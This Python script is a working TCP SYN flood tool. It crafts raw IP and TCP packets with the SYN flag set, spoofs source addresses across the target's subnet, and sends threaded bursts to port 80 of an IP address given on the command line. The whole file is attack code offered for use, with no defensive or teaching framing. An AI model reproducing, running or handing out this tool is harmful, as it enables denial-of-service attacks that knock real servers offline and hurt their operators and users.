import socket
import struct
import sys
from random import randrange
import threading

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(chr(msg[i])) << 8) + (ord(chr(msg[i+1])))
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def make_ip_header(src_ip, dest_ip):
    version = 4
    ihl = 5
    type_of_service = 0
    total_length = 20 + 20 
    hdr_id = 999
    flags_offset = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    header_checksum = 0
    src_addr = socket.inet_aton(src_ip)
    dest_addr = socket.inet_aton(dest_ip)
    ihl_ver = (version << 4) + ihl
    return struct.pack("!BBHHHBBH4s4s", ihl_ver, type_of_service,
                total_length, hdr_id, flags_offset, ttl,
                protocol, header_checksum, src_addr, dest_addr)

def make_tcp_header(port, ichecksum=None):
    src_port = port
    dest_addr_port = 80
    seq_num = 0
    ack_num = 0
    data_offset = 5
    flag_fin = 0
    flag_syn = 1
    flag_rst = 0
    flag_psh = 0
    flag_ack = 0
    flag_urg = 0
    window = socket.htons(5840)
    if ichecksum == None:
        checksum = 0
    else:
        checksum = ichecksum
    urgent_ptr = 0
    data_offset_resv = (data_offset << 4) + 0
    flags = (flag_urg << 5) + (flag_ack << 4) + (flag_psh << 3) + \
            (flag_rst << 2) + (flag_syn << 1) + flag_fin
    return struct.pack("!HHLLBBHHH", src_port, dest_addr_port, seq_num,
            ack_num, data_offset_resv, flags, window, checksum, urgent_ptr)

def send_burst(sock, dest_ip, burst=50):
    port_base = randrange(49152, int(65535-burst-255))
    src_ip_base = ".".join(dest_ip.split(".")[:-1])
    for j in range(1, burst):
        for l in range(1, 255):
            src_ip = str(src_ip_base + ".{}".format(l))

            ip_hdr = make_ip_header(src_ip, dest_ip)
            tcp_hdr = make_tcp_header(port_base+j+l)

            src_addr = socket.inet_aton(src_ip)
            dest_addr = socket.inet_aton(dest_ip)

            place_holder = 0
            proto = socket.IPPROTO_TCP
            tcp_len = len(tcp_hdr)
            psh = struct.pack("!4s4sBBH", src_addr, dest_addr,
                            place_holder, proto, tcp_len)
            psh += tcp_hdr
            tcp_checksum = checksum(psh)
            tcp_hdr = make_tcp_header(port_base+j+l, tcp_checksum)
            packet = ip_hdr + tcp_hdr
            sock.sendto(packet, (dest_ip, 0))

def syn_flood(dest_ip, iterations=20, burst=50, thread_num=2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    def make_burst():
        for i in range(iterations):
            try:
                send_burst(sock, dest_ip, burst=burst)
            except socket.error as err:
                print(f"ERROR: {err}")
                break
        return
    
    if thread_num > 0:
        threads = []
        for _ in range(thread_num):
            t = threading.Thread(target=make_burst)
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()



if len(sys.argv) > 1:
    dest_ip = str(sys.argv[1])
else:
    print("Supply destination IP address.")
    sys.exit()

syn_flood(dest_ip)